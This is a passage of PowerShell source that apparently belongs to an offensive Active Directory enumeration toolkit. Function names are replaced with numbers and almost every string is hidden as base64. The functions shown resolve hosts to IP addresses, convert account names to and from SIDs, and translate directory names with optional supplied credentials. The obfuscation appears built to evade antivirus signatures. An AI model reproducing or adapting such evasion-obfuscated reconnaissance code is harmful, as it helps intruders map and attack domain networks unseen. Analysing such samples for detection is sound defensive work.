    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94} = ${Env:94}
    )
    PROCESS {
        ForEach (${116} in ${94}) {
            try {
                @(([Net.Dns]::GetHostEntry(${116})).AddressList) | % {
                    if ($_.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        ${179} = New-Object PSObject
                        ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${116}
                        ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $_.IPAddressToString
                        ${179}
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAcwBvAGwAdgBlAC0ASQBQAEEAZABkAHIAZQBzAHMAXQAgAEMAbwB1AGwAZAAgAG4AbwB0ACAAcgBlAHMAbwBsAHYAZQAgACQAewAxADEANgB9ACAAdABvACAAYQBuACAASQBQACAAQQBkAGQAcgBlAHMAcwAuAA==')))
            }
        }
    }
}
function f102 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        ${460},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${545} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${545}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${545}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${545}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach ($Object in ${460}) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${225} = f111 -Identity $Object -f40 'DN' @545
                if (${225}) {
                    $UserDomain = ${225}.SubString(${225}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${120} = ${225}.Split(',')[0].split('=')[1]
                    ${545}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${120}
                    ${545}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                    ${545}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))
                    f98 @545 | select -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${545} = @{}
                        $Domain = (f69 @545).Name
                    }
                    ${544} = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    ${544}.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AFQAbwAtAFMASQBEAF0AIABFAHIAcgBvAHIAIABjAG8AbgB2AGUAcgB0AGkAbgBnACAAJABEAG8AbQBhAGkAbgBcACQATwBiAGoAZQBjAHQAIAA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function f94 {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        ${438},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${390} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${390}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${77} in ${438}) {
            ${77} = ${77}.trim('*')
            try {
                Switch (${77}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    Default {
                        f111 -Identity ${77} @390
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBTAEkARABdACAARQByAHIAbwByACAAYwBvAG4AdgBlAHIAdABpAG4AZwAgAFMASQBEACAAJwAkAHsANwA3AH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
}
function f111 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        ${f40},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${543} = @{
            'DN'                =   1  
            'Canonical'         =   2  
            'NT4'               =   3  
            'Display'           =   4  
            'DomainSimple'      =   5  
            'EnterpriseSimple'  =   6  
            'GUID'              =   7  
            'Unknown'           =   8  
            'UPN'               =   9  
            'CanonicalEx'       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }
        function f120([__ComObject] $Object, [String] $Method, ${f41}) {
            ${134} = $Null
            ${134} = $Object.GetType().InvokeMember($Method, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $NULL, $Object, ${f41})
            echo ${134}
        }
        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, $NULL)
        }
        function f121([__ComObject] $Object, [String] $Property, ${f41}) {
            [Void] $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $Object, ${f41})
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${541} = 2
            ${540} = $Server
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${541} = 1
            ${540} = $Domain
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${542} = $Credential.GetNetworkCredential()
            ${541} = 1
            ${540} = ${542}.Domain
        }
        else {
            ${541} = 3
            ${540} = $Null
        }
    }
    PROCESS {
        ForEach (${434} in $Identity) {
            if (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAVAB5AHAAZQA=')))]) {
                if (${434} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAEEALQBaAGEALQB6AF0AKwBcAFwAWwBBAC0AWgBhAC0AegAgAF0AKwA=')))) {
                    ${538} = ${543}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))]
                }
                else {
                    ${538} = ${543}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUADQA')))]
                }
            }
            else {
                ${538} = ${543}[${f40}]
            }
            ${539} = New-Object -ComObject NameTranslate
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                try {
                    ${542} = $Credential.GetNetworkCredential()
                    f120 ${539} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABFAHgA'))) (
                        ${541},
                        ${540},
                        ${542}.UserName,
                        ${542}.Domain,
                        ${542}.Password
                    )
                }
                catch {
